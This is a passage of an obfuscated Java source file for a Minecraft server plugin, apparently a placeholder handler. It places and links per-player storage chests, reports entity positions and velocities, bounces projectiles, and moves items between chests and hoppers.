            World wftuynfdyuw = Bukkit.getWorld(fwdyunwfydunfwd);
            if (wftuynfdyuw == null) {
                wftuynfdyuw = Bukkit.createWorld(new WorldCreator(fwdyunwfydunfwd)
                        .environment(World.Environment.NORMAL)
                        .generateStructures(arsdienwdhw)
                        .type(WorldType.FLAT));
                Bukkit.getLogger().info(wydkawyfpudawfd);
            }


            int pfdypd, wfdybfwd, tmfwyd;
            String tywufnd = f2.getUniqueId().toString();
            String aoienrsh = g20.getString(tywufnd);
            if (aoienrsh != null) {
                // An entry exists for this player; use it.
                String[] oienarst = aoienrsh.split(sowhat);
                pfdypd = Integer.parseInt(oienarst[I]);
                wfdybfwd = Integer.parseInt(oienarst[INT3]);
                tmfwyd = Integer.parseInt(oienarst[mill2]);
            } else {
                // No entry exists, so compute new coordinates.
                // Use the "last" entry in viewOnlyChestConfig; if missing, use defaults.
                String neoitsra = g20.getString(aoienrstd);
                int qoienfwgp, neiotstw, ubfwtwfyutnwfyd;
                if (neoitsra == null) {
                    // No previous entries: default to chunk X = 9, chunk Z = 9, relative X = 0, relative Z = 0, Y = world minimum.
                    qoienfwgp = oiwfndtoyu42nd24 * INT4;
                    ubfwtwfyutnwfyd = oiwfndtoyu42nd24 * INT4;
                    assert wftuynfdyuw != null;
                    neiotstw = wftuynfdyuw.getMinHeight();
                } else {
                    String[] udtnwyadnwfpd = neoitsra.split(sowhat);
                    qoienfwgp = Integer.parseInt(udtnwyadnwfpd[I]);
                    neiotstw = Integer.parseInt(udtnwyadnwfpd[INT3]);
                    ubfwtwfyutnwfyd = Integer.parseInt(udtnwyadnwfpd[mill2]);
                }
                // Step 1: Add 2 to the last entry's z.
                pfdypd = qoienfwgp;
                wfdybfwd = neiotstw;
                tmfwyd = ubfwtwfyutnwfyd + mill2;
                // Step 2: If new z >= 16 (relative to the chunk), reset z to 0 and increment x by 2.
                int wpdkywpnfd = tmfwyd % INT4;
                if (wpdkywpnfd >= INT4) { // In practice, since we add 2, check if relZ >= 16.
                    tmfwyd = (tmfwyd / INT4) * INT4; // reset relative z to 0
                    pfdypd = qoienfwgp + mill2;
                }
                // Step 3: If new x's relative value is >= 16, set x=0 and increment y by 1.
                int wfkdywfd = pfdypd % INT4;
                if (wfkdywfd >= INT4) {
                    pfdypd = (pfdypd / INT4) * INT4;
                    wfdybfwd = neiotstw + INT3;
                }
                // Step 4: If y is past the build limit, set y to the minimum and increment x by 16.
                assert wftuynfdyuw != null;
                if (wfdybfwd > wftuynfdyuw.getMaxHeight()) {
                    wfdybfwd = wftuynfdyuw.getMinHeight();
                    pfdypd = qoienfwgp + INT4;
                }
                // Store the computed coordinates under the player's UUID and update the "last" entry.
                String wdkyud = pfdypd + sowhat + wfdybfwd + sowhat + tmfwyd;
                g20.set(tywufnd, wdkyud);
                g20.set(aoienrstd, wdkyud);
                try {
                    g20.save(g16);
                } catch (IOException ignored) {
                }
            }

            // Now, place chests at the computed coordinates—but only if we computed them now.
            // If the player's entry already existed, we skip placement.
            if (aoienrsh == null) {
                // Place a single chest at (destX, destY, destZ)
                Location wfdkywfpd = new Location(wftuynfdyuw, pfdypd, wfdybfwd, tmfwyd);
                Block tbwflbd = wfdkywfpd.getBlock();
                if (tbwflbd.getType() != Material.CHEST) {
                    tbwflbd.setType(Material.CHEST);
                } 
                // Place a double chest at (destX, destY, destZ+1) and (destX+1, destY, destZ+1)
                Location wtyunwfdafd = new Location(wftuynfdyuw, pfdypd, wfdybfwd, tmfwyd + INT3);
                Location tfwkyundf = new Location(wftuynfdyuw, pfdypd + INT3, wfdybfwd, tmfwyd + INT3);
                Block twfklb = wtyunwfdafd.getBlock();
                Block tkyfbd = tfwkyundf.getBlock();
                if (twfklb.getType() != Material.CHEST || tkyfbd.getType() != Material.CHEST) {
                    twfklb.setType(Material.CHEST);
                    tkyfbd.setType(Material.CHEST);
                    // Link the double chest halves
                    Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), () -> {
                        try {
                            Chest dwnyuwnfd = (Chest) twfklb.getState();
                            Chest yudanwyofdunawfpd = (Chest) tkyfbd.getState();
                            org.bukkit.block.data.type.Chest kwdynwdkwf = (org.bukkit.block.data.type.Chest) dwnyuwnfd.getBlockData();
                            org.bukkit.block.data.type.Chest dwtbfldbwufd = (org.bukkit.block.data.type.Chest) yudanwyofdunawfpd.getBlockData();
                            kwdynwdkwf.setType(org.bukkit.block.data.type.Chest.Type.LEFT);
                            dwtbfldbwufd.setType(org.bukkit.block.data.type.Chest.Type.RIGHT);
                            kwdynwdkwf.setFacing(BlockFace.NORTH);
                            dwtbfldbwufd.setFacing(BlockFace.NORTH);
                            dwnyuwnfd.setBlockData(kwdynwdkwf);
                            yudanwyofdunawfpd.setBlockData(dwtbfldbwufd);
                            String tkfwyudywfnd = f2.getUniqueId().toString();
                            dwnyuwnfd.setCustomName(tkfwyudywfnd);
                            yudanwyofdunawfpd.setCustomName(tkfwyudywfnd);
                            dwnyuwnfd.update(NEW_VALUE1);
                            yudanwyofdunawfpd.update(NEW_VALUE1);
                        } catch (Exception ignored) {
                        }
                    }, healing);
                } 
            } 


            Location tfwyndtywfnd = wtyufwntyunwfd ? new Location(wftuynfdyuw, pfdypd, wfdybfwd, tmfwyd + INT3) : new Location(wftuynfdyuw, pfdypd, wfdybfwd, tmfwyd);

            Chest twkfdtyfndw = (Chest) (tfwyndtywfnd.getBlock().getState());


            // Build a modified inventory: copy items from the source chest (modifying the ei-id) and fill any missing slots with a default pane.
            Inventory fwdwfyedunfwd = wfdkyfwdkyfwud.getInventory();
            int tfwyukdywfpud = fwdwfyedunfwd.getSize();
            int tywfndaywbkd = wtyufwntyunwfd ? INT6 : INT5;

            ItemStack[] twyfladhylwfdh = new ItemStack[tywfndaywbkd];
            for (int dtkwyfudwd = I; dtkwyfudwd < tywfndaywbkd; dtkwyfudwd++) {
                if (dtkwyfudwd < tfwyukdywfpud && fwdwfyedunfwd.getItem(dtkwyfudwd) != null) {
                    twyfladhylwfdh[dtkwyfudwd] = f1(Objects.requireNonNull(fwdwfyedunfwd.getItem(dtkwyfudwd)));
                } else {
                    twyfladhylwfdh[dtkwyfudwd] = f0();
                }
            }
            // Update destination chest inventory without an extra clear call (setContents overrides existing items)
            try {
                twkfdtyfndw.update();

                twkfdtyfndw.getInventory().setContents(twyfladhylwfdh);
            } catch (Exception ex) {
                return wdypfauwdnwfpd;
            }

            // Return the destination coordinates.
            if (g6) {
                f2.sendMessage(tyabfydkfpydnpfd + pfdypd + sowhat + wfdybfwd + sowhat + tmfwyd);
            }
            return wtyufwntyunwfd ? pfdypd + sowhat + wfdybfwd + sowhat + (tmfwyd + INT3): pfdypd + sowhat + wfdybfwd + sowhat + tmfwyd;
        }




        if (f1.startsWith(wyndaoyfwpudnfpd)) {
            
            try {
                String[] dylpfdafp = f1.substring(wyndaoyfwpudnfpd.length()).split(keep);
                if (dylpfdafp.length != xm) {
                    return dyunwypfudnawfdyun;
                }

                String fuanidkaywdh = dylpfdafp[I];
                int wfytdnwfydun = Integer.parseInt(dylpfdafp[INT3]);
                int wfdtyunwfdyunfwd = Integer.parseInt(dylpfdafp[mill2]);
                int wfyudnywufndwfd = Integer.parseInt(dylpfdafp[ccp]);
                int wyufdnyounawfd = Integer.parseInt(dylpfdafp[INT7]);

                World ftonoyruinsdw = Bukkit.getWorld(fuanidkaywdh);
                if (ftonoyruinsdw == null) {
                    return wfduynwyaufnd;
                }
                

                Location ydnoayfupdnwfpd = new Location(ftonoyruinsdw, wfytdnwfydun, wfdtyunwfdyunfwd, wfyudnywufndwfd);


                org.bukkit.Location twfutnyuwfnd = ydnoayfupdnwfpd;
                double wdwfpyudnwfypud = tyafndydpfw;
                String label = fysoadunofwypdun;


                double ywundaoywufdnp = wdwfpyudnwfypud * wdwfpyudnwfypud;
                for (org.bukkit.entity.Player yufpdnoafyupdpd : ftonoyruinsdw.getPlayers()) {
                    if (yufpdnoafyupdpd.getLocation().distanceSquared(twfutnyuwfnd) <= ywundaoywufdnp) {
                        wm(yufpdnoafyupdpd, label);
                    }
                }
                // Convert blocks to falling blocks
                f1(ftonoyruinsdw, ydnoayfupdnwfpd, wyufdnyounawfd);

                // Attract entities to the center
                f2(ftonoyruinsdw, ydnoayfupdnwfpd, wyufdnyounawfd);

                return wfytdnwfydun + sowhat + wfdtyunwfdyunfwd + sowhat + wfyudnywufndwfd;
            } catch (Exception e) {
                e.printStackTrace();
                return NEW_VALUE_3 + e.getMessage();
            }
        }


        if (f1.startsWith(yrsndoawyfudn)) {
            String uuidString = f1.substring(yrsndoawyfudn.length());
            try {
                UUID uuid = UUID.fromString(uuidString);
                Entity entity = Bukkit.getEntity(uuid);
                if (entity != null) {
                    double x = entity.getLocation().getX();
                    return String.format("%.3f", x);
                }
            } catch (IllegalArgumentException e) {
                return NEW_VALUE_3;
            }
            return NEW_VALUE_3;
        }

        if (f1.startsWith(swyadunwfoydun)) {
            String uuidString = f1.substring(swyadunwfoydun.length());
            try {
                UUID uuid = UUID.fromString(uuidString);
                Entity entity = Bukkit.getEntity(uuid);
                if (entity != null) {
                    double y = entity.getLocation().getY();
                    return String.format("%.3f", y);
                }
            } catch (IllegalArgumentException e) {
                return NEW_VALUE_3;
            }
            return NEW_VALUE_3;
        }

        if (f1.startsWith(naoyfdundfw)) {
            String uuidString = f1.substring(naoyfdundfw.length());
            try {
                UUID uuid = UUID.fromString(uuidString);
                Entity entity = Bukkit.getEntity(uuid);
                if (entity != null) {
                    double z = entity.getLocation().getZ();
                    return String.format("%.3f", z);
                }
            } catch (IllegalArgumentException e) {
                return NEW_VALUE_3;
            }
            return NEW_VALUE_3;
        }



        if (f1.startsWith(owayfudny34hyfundywfudw)) {
            wm(f2, fudnoaywfudhoywafld);
            long wfdynwduyfn = Long.parseLong(f1.substring(owayfudny34hyfundywfudw.length()));

            // Get or create the world
            World wyfldhwfydh = Bukkit.getWorld(fwdyunwfydunfwd);
            if (wyfldhwfydh == null) {
                wyfldhwfydh = Bukkit.createWorld(new WorldCreator(fwdyunwfydunfwd)
                        .environment(World.Environment.NORMAL)
                        .generateStructures(arsdienwdhw)
                        .type(WorldType.FLAT));
                Bukkit.getLogger().info(fwaodhwfypdh);
            }

            // Get player UUID
            String wfdnwyfudnwyfudnwfd = f2.getUniqueId().toString();

            // Load or assign coordinates from the double chest database
            int wfdyunwyfdn, wtulhwfulhd, tyfwunyunfdt;
            String yfuntya = g17.getString(wfdnwyfudnwyfudnwfd);
            if (yfuntya != null) {
                String[] fwdyafpndoyafudn = yfuntya.split(sowhat);
                wfdyunwyfdn = Integer.parseInt(fwdyafpndoyafudn[I]);
                wtulhwfulhd = Integer.parseInt(fwdyafpndoyafudn[INT3]);
                tyfwunyunfdt = Integer.parseInt(fwdyafpndoyafudn[mill2]);
            } else {
                // Assign new coordinates in a chunk-efficient way
                assert wyfldhwfydh != null;
                int[] fdynyfpdunfpd = f2(wyfldhwfydh);
                wfdyunwyfdn = fdynyfpdunfpd[I];
                wtulhwfulhd = fdynyfpdunfpd[INT3];
                tyfwunyunfdt = fdynyfpdunfpd[mill2];

                // Save the assigned coordinates to the double chest database
                String pndyounpdwfiorensat = wfdyunwyfdn + sowhat + wtulhwfulhd + sowhat + tyfwunyunfdt;
                g17.set(wfdnwyfudnwyfudnwfd, pndyounpdwfiorensat);
                f3();
            }

            // Create the double chest at the given coordinates if not already present
            Location oyfpndoyualf = new Location(wyfldhwfydh, wfdyunwyfdn, wtulhwfulhd, tyfwunyunfdt);
            Location hyhdyunk = new Location(wyfldhwfydh, wfdyunwyfdn + INT3, wtulhwfulhd, tyfwunyunfdt); // Adjacent chest for double chest pair

            Block yunypdb = oyfpndoyualf.getBlock();
            Block kvyfkbyuvnp = hyhdyunk.getBlock();

            if (!(yunypdb.getState() instanceof Chest) || !(kvyfkbyuvnp.getState() instanceof Chest)) {
                yunypdb.setType(Material.CHEST);
                kvyfkbyuvnp.setType(Material.CHEST);

                // Wait for the world to register the chest placement
                Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), () -> {
                    Chest nylhbylhf = (Chest) yunypdb.getState();
                    Chest kdynpfkdwfpd = (Chest) kvyfkbyuvnp.getState();

                    // Update the block data to link them as a double chest
                    nylhbylhf.setCustomName(String.valueOf(wfdynwduyfn));
                    nylhbylhf.update(NEW_VALUE1);
                    kdynpfkdwfpd.setCustomName(String.valueOf(wfdynwduyfn));
                    kdynpfkdwfpd.update(NEW_VALUE1);

                    Bukkit.getLogger().info(fydnoafypudkopnbkdf + wfdyunwyfdn + wyudnywufodn + wtulhwfulhd + wyudnywufodn + tyfwunyunfdt);
                }, healing);
                }

            Chest ydunayfpwodnu = (Chest) yunypdb.getState();

            // Save current chest contents if the chest is already named
            String kybvkfpyb = ydunayfpwodnu.getCustomName();
            if (kybvkfpyb != null && !kybvkfpyb.isEmpty()) {
                f2(kybvkfpyb, ydunayfpwodnu.getInventory().getContents());
            }

            // Set the new chest name and update it
            ydunayfpwodnu.setCustomName(String.valueOf(wfdynwduyfn));
            ydunayfpwodnu.update(NEW_VALUE1);
            ydunayfpwodnu.getInventory().clear();

            // Load the new chest contents from the file if available
            ItemStack[] wfydunfaoyupdn = f(String.valueOf(wfdynwduyfn));
            if (wfydunfaoyupdn != null) {
                ydunayfpwodnu.getInventory().setContents(wfydunfaoyupdn);
                Bukkit.getLogger().info(foaybkfpoyubhl + wfdynwduyfn);
            } else {
                Bukkit.getLogger().info(pfwydoakfopydhfpwoyd + wfdynwduyfn);
            }

            return wfdyunwyfdn + sowhat + wtulhwfulhd + sowhat + tyfwunyunfdt;
        }

        
        
        if (f1.startsWith(yofapdnoyfpubdhfyp)) {
            wm(f2, fudnoaywfudhoywafld);
            long wfyfdnhaoyfpohdoypfh = Long.parseLong(f1.substring(yofapdnoyfpubdhfyp.length()));

            // Get or create the world
            World fpydaohfpybdhafp = Bukkit.getWorld(fwdyunwfydunfwd);
            if (fpydaohfpybdhafp == null) {
                fpydaohfpybdhafp = Bukkit.createWorld(new WorldCreator(fwdyunwfydunfwd)
                        .environment(World.Environment.NORMAL)
                        .generateStructures(arsdienwdhw)
                        .type(WorldType.FLAT));
                Bukkit.getLogger().info(fwaodhwfypdh);
            }

            // Get player UUID
            String ydonfpoayudnofypd = f2.getUniqueId().toString();

            // Load or assign coordinates from the database
            int tkywnfbdtywlfhd, wyfdbtylwfbdylwfb, wyfudntywund;
            String wfydlbwyfld = g18.getString(ydonfpoayudnofypd);
            if (wfydlbwyfld != null) {
                String[] kydkpfd = wfydlbwyfld.split(sowhat);
                tkywnfbdtywlfhd = Integer.parseInt(kydkpfd[I]);
                wyfdbtylwfbdylwfb = Integer.parseInt(kydkpfd[INT3]);
                wyfudntywund = Integer.parseInt(kydkpfd[mill2]);
            } else {
                // Assign new coordinates in a chunk-efficient way
                assert fpydaohfpybdhafp != null;
                int[] nyuwdnywufndwfpdk = f1(fpydaohfpybdhafp);
                tkywnfbdtywlfhd = nyuwdnywufndwfpdk[I];
                wyfdbtylwfbdylwfb = nyuwdnywufndwfpdk[INT3];
                wyfudntywund = nyuwdnywufndwfpdk[mill2];

                // Save the assigned coordinates to the database
                String dknywufpndyuwpfnd = tkywnfbdtywlfhd + sowhat + wyfdbtylwfbdylwfb + sowhat + wyfudntywund;
                g18.set(ydonfpoayudnofypd, dknywufpndyuwpfnd);
                f2();
            }

            // Create the chest at the given coordinates if not already present
            Location thnylhyh34d = new Location(fpydaohfpybdhafp, tkywnfbdtywlfhd, wyfdbtylwfbdylwfb, wyfudntywund);
            Block dnuyn4 = thnylhyh34d.getBlock();
            if (!(dnuyn4.getState() instanceof Chest)) {
                dnuyn4.setType(Material.CHEST);
                Bukkit.getLogger().info(iedn4dn8394d + tkywnfbdtywlfhd + wyudnywufodn + wyfdbtylwfbdylwfb + wyudnywufodn + wyfudntywund);
            }

            Chest y3u4dny = (Chest) dnuyn4.getState();

// Check if the chest already has a name and save its contents before updating
            String kde3n4 = y3u4dny.getCustomName();
            if (kde3n4 != null && !kde3n4.isEmpty()) {
                // Save the existing chest contents to a file based on its current name
                f1(kde3n4, y3u4dny.getInventory().getContents());
            }

// Update the chest name and clear its contents
            y3u4dny.setCustomName(String.valueOf(wfyfdnhaoyfpohdoypfh));
            y3u4dny.update(NEW_VALUE1);
            y3u4dny.getInventory().clear();

// Load the new chest contents from the file if available
            ItemStack[] miedn4342 = f1(String.valueOf(wfyfdnhaoyfpohdoypfh));
            if (miedn4342 != null) {
                y3u4dny.getInventory().setContents(miedn4342);
                Bukkit.getLogger().info(oi2n43g234g + wfyfdnhaoyfpohdoypfh);
            } else {
                Bukkit.getLogger().info(enhien4g + wfyfdnhaoyfpohdoypfh);
            }

            return tkywnfbdtywlfhd + sowhat + wyfdbtylwfbdylwfb + sowhat + wyfudntywund;
        }

        final double NUDGE_AMOUNT = kiek4d;

        if (f1.startsWith(yfnvdyfupbd)) {
            // Format: %Archistructure_bounce2_UUID,FACE,PITCH,YAW,VELOCITY%
            String[] parts = f1.substring(yfnvdyfupbd.length()).split(keep);

            if (parts.length != xm) return dyunwypfudnawfdyun;

            UUID uuid;
            try {
                uuid = UUID.fromString(parts[I]);
            } catch (IllegalArgumentException e) {
                return "Invalid UUID!";
            }

            BlockFace face;
            try {
                face = BlockFace.valueOf(parts[INT3].toUpperCase());
            } catch (IllegalArgumentException e) {
                return "Invalid face!";
            }

            Entity entity = null;
            for (World world : Bukkit.getWorlds()) {
                entity = world.getEntities().stream()
                        .filter(e -> e.getUniqueId().equals(uuid))
                        .findFirst()
                        .orElse(null);
                if (entity != null) break;
            }

            if (entity == null) return yuntunyun342;

            float pitch, yaw;
            double velocityMagnitude;

            try {
                // Handle pitch input
                if (parts[mill2].equalsIgnoreCase("pitch")) {
                    pitch = entity.getLocation().getPitch();
                } else {
                    pitch = Float.parseFloat(parts[mill2]);
                }

                // Handle yaw input
                if (parts[ccp].equalsIgnoreCase("yaw")) {
                    yaw = entity.getLocation().getYaw();
                } else {
                    yaw = Float.parseFloat(parts[ccp]);
                }

                velocityMagnitude = Double.parseDouble(parts[INT7]);

            } catch (NumberFormatException e) {
                return kwafpdkwfpad;
            }

            // Convert pitch/yaw to direction vector
            float pitchRad = (float) Math.toRadians(pitch);
            float yawRad = (float) Math.toRadians(yaw);

            double x = -Math.sin(yawRad) * Math.cos(pitchRad);
            double y = -Math.sin(pitchRad);
            double z = Math.cos(yawRad) * Math.cos(pitchRad);
            Vector direction = new Vector(x, y, z).normalize().multiply(velocityMagnitude);

            Vector adjustedVelocity = direction.clone();

            // Reflect based on impact face
            switch (face) {
                case UP:
                case DOWN:
                    adjustedVelocity.setY(-adjustedVelocity.getY());
                    break;
                case NORTH:
                case SOUTH:
                    adjustedVelocity.setZ(-adjustedVelocity.getZ());
                    break;
                case EAST:
                case WEST:
                    adjustedVelocity.setX(-adjustedVelocity.getX());
                    break;
                default:
                    return "Invalid face!";
            }

            // Directional unstick nudge
            Vector nudgeVector = new Vector(face.getModX(), face.getModY(), face.getModZ()).multiply(NUDGE_AMOUNT);
            entity.setVelocity(nudgeVector); // Initial nudge

            // Schedule proper bounce
            Entity finalEntity = entity;
            Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), () -> {
                Location nudgedLoc = finalEntity.getLocation().add(nudgeVector);
                finalEntity.teleport(nudgedLoc);
                finalEntity.setVelocity(adjustedVelocity);
                finalEntity.setTicksLived(INT3);
            }, healing);

            return String.format("%.4f", adjustedVelocity.length());
        }

        
        
        if (f1.startsWith(kdin34d34dn)) {
            String uuidStr = f1.substring(kdin34d34dn.length());

            UUID uuid;
            try {
                uuid = UUID.fromString(uuidStr);
            } catch (IllegalArgumentException e) {
                return yunduyn4;
            }

            Entity target = null;

            // Search all worlds for entity with that UUID
            for (World world : Bukkit.getWorlds()) {
                target = world.getEntities().stream()
                        .filter(ent -> ent.getUniqueId().equals(uuid))
                        .findFirst()
                        .orElse(null);
                if (target != null) break;
            }

            if (target == null) {
                return yuntunyun342;
            }

            Vector v = target.getVelocity();
            return v.getX() + sowhat + v.getY() + sowhat + v.getZ();
        }

// Tunable displacement to help unstick projectiles

        if (f1.startsWith("bounce_")) {
            // Format: %Archistructure_bounce_UUID,FACE,SCALE%
            String[] parts = f1.substring("bounce_".length()).split(keep);

            if (parts.length != ccp) return dyunwypfudnawfdyun;

            UUID uuid;
            try {
                uuid = UUID.fromString(parts[I]);
            } catch (IllegalArgumentException e) {
                return "Invalid UUID!";
            }

            BlockFace face;
            try {
                face = BlockFace.valueOf(parts[INT3].toUpperCase());
            } catch (IllegalArgumentException e) {
                return "Invalid face!";
            }

            double scale;
            try {
                scale = Double.parseDouble(parts[mill2]);
            } catch (NumberFormatException e) {
                return "Invalid scale!";
            }


            Entity entity = null;
            for (World world : Bukkit.getWorlds()) {
                entity = world.getEntities().stream()
                        .filter(e -> e.getUniqueId().equals(uuid))
                        .findFirst()
                        .orElse(null);
                if (entity != null) break;
            }

            if (entity == null) return yuntunyun342;

            Vector originalVelocity = entity.getVelocity();
            Vector adjustedVelocity = originalVelocity.clone();

            // Reflect based on impact face
            switch (face) {
                case UP:
                case DOWN:
                    adjustedVelocity.setY(-adjustedVelocity.getY());
                    break;
                case NORTH:
                case SOUTH:
                    adjustedVelocity.setZ(-adjustedVelocity.getZ());
                    break;
                case EAST:
                case WEST:
                    adjustedVelocity.setX(-adjustedVelocity.getX());
                    break;
                default:
                    return "Invalid face!";
            }

            adjustedVelocity.normalize().multiply(scale);

            // Determine the proper nudge direction from the impact face
            Vector nudgeDirection = new Vector(face.getModX(), face.getModY(), face.getModZ()).multiply(NUDGE_AMOUNT);

            // Apply a small bump in the direction *away* from the block
            entity.setVelocity(nudgeDirection); // will help unstick the entity

            // Apply real bounce in the next tick
            Entity finalEntity = entity;
            Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), () -> {
                // Slightly offset the location too, in the same direction
                Location nudgedLoc = finalEntity.getLocation().add(nudgeDirection);
                finalEntity.teleport(nudgedLoc);

                finalEntity.setVelocity(adjustedVelocity);
                finalEntity.setTicksLived(INT3);
            }, healing);

            return String.format("%.4f", adjustedVelocity.length());
        }


        if (f1.startsWith(ky3dnk34npdk3yp4ndky34pdnk3)) {
            wm(f2, kifwpnevdkiwpfend);
            String[] parts = f1.substring(ky3dnk34npdk3yp4ndky34pdnk3.length()).split(keep);
            if (parts.length < yuwfndgyuwfnd) {
                return kyntkyfuwnd;
            }

            try {
                // Extract world and coordinates
                World sourceWorld = Bukkit.getWorld(parts[I]);
                int sourceX = Integer.parseInt(parts[INT3]);
                int sourceY = Integer.parseInt(parts[mill2]);
                int sourceZ = Integer.parseInt(parts[ccp]);
                World targetWorld = Bukkit.getWorld(parts[INT7]);
                int targetX = Integer.parseInt(parts[xm]);
                int targetY = Integer.parseInt(parts[xtxtxt]);
                int targetZ = Integer.parseInt(parts[suppose]);

                if (sourceWorld == null || targetWorld == null) {
                    return "Invalid world name.";
                }

                Location sourceLocation = new Location(sourceWorld, sourceX, sourceY, sourceZ);
                Location targetLocation = new Location(targetWorld, targetX, targetY, targetZ);

                // Check if target is a chest
                Block targetBlock = targetLocation.getBlock();
                if (!(targetBlock.getState() instanceof Chest chest)) {
                    return "There is no chest at " + targetX + keep + targetY + keep + targetZ + " in " + targetWorld.getName();
                }

                Inventory chestInventory = chest.getInventory(); // Get the chest's inventory

                // Collect dropped items in a 1x1x1 area
                List<Item> itemsToTransfer = new ArrayList<>();
                for (Entity entity : sourceWorld.getNearbyEntities(sourceLocation, 0.7, 0.7, 0.7)) {
                    if (entity instanceof Item itemEntity) {
                        itemsToTransfer.add(itemEntity);
                    }
                }

                if (itemsToTransfer.isEmpty()) {
                    return "No items to vacuum at " + sourceX + keep + sourceY + keep + sourceZ;
                }

                // Insert items one-by-one into the chest
                for (Item itemEntity : itemsToTransfer) {
                    ItemStack itemStack = itemEntity.getItemStack();

                    // Find the first empty slot
                    int emptySlot = chestInventory.firstEmpty();
                    if (emptySlot != -INT3) {
                        // Place item in chest and remove from world
                        chestInventory.setItem(emptySlot, itemStack);
                        itemEntity.remove();
                    } else {
                        // If chest is full, just delete the item
                        itemEntity.remove();
                    }
                }

                return "Vacuum transfer complete!";
            } catch (Exception e) {
                e.printStackTrace();
                return "Error processing vacuum cleaner.";
            }
        }




        if (f1.startsWith(ywntvyoafupbnf)) 
        {
            wm(f2, pdnofypundafopd);
            String[] yonbyfphdp = f1.substring(ywntvyoafupbnf.length()).split(keep);
            if (yonbyfphdp.length != yuwfndgyuwfnd) {
                return fpondafypudnopfyudn;
            }

            try {
                // Extract input coordinates
                World eddylwdy = Bukkit.getWorld(yonbyfphdp[I]);
                int yfndyuwfdn = Integer.parseInt(yonbyfphdp[INT3]);
                int btfulb3 = Integer.parseInt(yonbyfphdp[mill2]);
                int bemy4g = Integer.parseInt(yonbyfphdp[ccp]);

                // Extract output coordinates
                World eyutdn24d = Bukkit.getWorld(yonbyfphdp[INT7]);
                int k2enk = Integer.parseInt(yonbyfphdp[xm]);
                int kient3 = Integer.parseInt(yonbyfphdp[xtxtxt]);
                int noeianst3 = Integer.parseInt(yonbyfphdp[suppose]);

                org.bukkit.Location tneiniwent3243 = new org.bukkit.Location(eddylwdy, yfndyuwfdn, btfulb3, bemy4g); // <-- your x,y,z
                double enitioenfwta3 = low;
                String fietnoeirsnat4 = pdnofypundafopd;


                double ientine4 = enitioenfwta3 * enitioenfwta3;
                for (org.bukkit.entity.Player teinao4 : eddylwdy.getPlayers()) {
                    if (teinao4.getLocation().distanceSquared(tneiniwent3243) <= ientine4) {
                        wm(teinao4, fietnoeirsnat4);
                    }
                }



                org.bukkit.Location tofatno4 = new org.bukkit.Location(eyutdn24d, k2enk, kient3, noeianst3); // <-- your x,y,z

                for (org.bukkit.entity.Player tn4o2ntd : eyutdn24d.getPlayers()) {
                    if (tn4o2ntd.getLocation().distanceSquared(tofatno4) <= ientine4) {
                        wm(tn4o2ntd, fietnoeirsnat4);
                    }
                }

                if (eddylwdy == null || eyutdn24d == null) {
                    return dnofpadn4;
                }

                Block wfdnwoyd = eddylwdy.getBlockAt(yfndyuwfdn, btfulb3, bemy4g);
                Block dwiewkpfd = eyutdn24d.getBlockAt(k2enk, kient3, noeianst3);

                if (!(wfdnwoyd.getState() instanceof Hopper inHopper)) {
                    return dnoi43end;
                }

                if (!(dwiewkpfd.getState() instanceof Hopper outHopper)) {
                    return niend4;
                }

                Inventory dyny4u = inHopper.getInventory();
                Inventory dynkd = outHopper.getInventory();

                // Find the first non-empty slot in the input hopper
                ItemStack ywufntoyufwnat4 = null;
                int twyuftnyuwnfd = -INT3;

                for (int dyhyandoy4 = I; dyhyandoy4 < dyny4u.getSize(); dyhyandoy4++) {
                    ItemStack ftnwfyutn4 = dyny4u.getItem(dyhyandoy4);
                    if (ftnwfyutn4 != null && ftnwfyutn4.getAmount() > I) {
                        ywufntoyufwnat4 = ftnwfyutn4.clone(); // Clone the entire stack
                        twyuftnyuwnfd = dyhyandoy4;
                        break;
                    }
                }

                if (ywufntoyufwnat4 == null) {
                    return notiefpnd4;
                }

                int tuyfpndtyun4 = ywufntoyufwnat4.getAmount(); // Get the entire stack amount

                // Try to add the item to an existing stack first
                for (int tuwnfpdyun4 = I; tuwnfpdyun4 < dynkd.getSize(); tuwnfpdyun4++) {
                    ItemStack wtiefnwoient34 = dynkd.getItem(tuwnfpdyun4);

                    if (wtiefnwoient34 != null && wtiefnwoient34.isSimilar(ywufntoyufwnat4)) {
                        int dufpnofnpd3 = wtiefnwoient34.getMaxStackSize();
                        int wtfunyu4 = wtiefnwoient34.getAmount();

                        if (wtfunyu4 < dufpnofnpd3) {
                            int wfytnoyunyu4 = dufpnofnpd3 - wtfunyu4;
                            int tenoiften4 = Math.min(tuyfpndtyun4, wfytnoyunyu4);

                            wtiefnwoient34.setAmount(wtfunyu4 + tenoiften4);
                            tuyfpndtyun4 -= tenoiften4;

                            if (tuyfpndtyun4 <= I) {
                                dyny4u.setItem(twyuftnyuwnfd, null); // Remove stack from input
                                return osiaenoiwfend4;
                            }
                        }
                    }
                }

                // If there is still remaining amount to transfer, find an empty slot
                int wdyunfpoy = dynkd.firstEmpty();
                if (wdyunfpoy != -INT3) {
                    ywufntoyufwnat4.setAmount(tuyfpndtyun4);
                    dynkd.setItem(wdyunfpoy, ywufntoyufwnat4);
                    dyny4u.setItem(twyuftnyuwnfd, null); // Remove stack from input
                    return osiaenoiwfend4;
                }

                return teianfoipedn4;
            } catch (NumberFormatException e) {
                return io2e4npoie2nt;
            } catch (Exception e) {
                e.printStackTrace();
                return ioidenipofaedn4;
            }
        }

        
        
        if (f1.startsWith(io3iedn3i4p)) {
            wm(f2, iopidqen34i);
            String[] io3pdn34 = f1.substring(io3iedn3i4p.length()).split(tsrt);
            if (io3pdn34.length != mill2) {
                return wifadndgn43gd;
            }

            try {
                int ion3die34d = Integer.parseInt(io3pdn34[I]);
                int iontde43d3p4d = Integer.parseInt(io3pdn34[INT3]) * odafuwidnowfidun; // Convert seconds to ticks

                f1(f2, ion3die34d, iontde43d3p4d);
                return io34igeng;
            } catch (NumberFormatException e) {
                return io43gdie34ngd;
            }
        }

        if (f1.equals(yunyundg54h45) && f2 != null) {

            if (!f1(f2, kd3nd)) return null;

            User user = g23.getPlayerAdapter(Player.class).getUser(f2);

            // Skip users with "ei.*" or "ei.itemfolderbypass"
            if (user.getCachedData().getPermissionData().checkPermission("ei.*").asBoolean() ||
                    user.getCachedData().getPermissionData().checkPermission("ei.itemfolderbypass").asBoolean() ||
